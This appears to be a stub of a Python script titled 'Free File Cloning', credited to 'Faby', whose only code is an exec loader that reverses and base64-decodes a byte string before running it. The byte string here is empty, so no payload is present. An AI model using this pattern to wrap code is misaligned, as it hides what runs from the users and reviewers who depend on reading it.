#Created by Faby#
#Free File Cloning#
#Please Follow my github account#
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))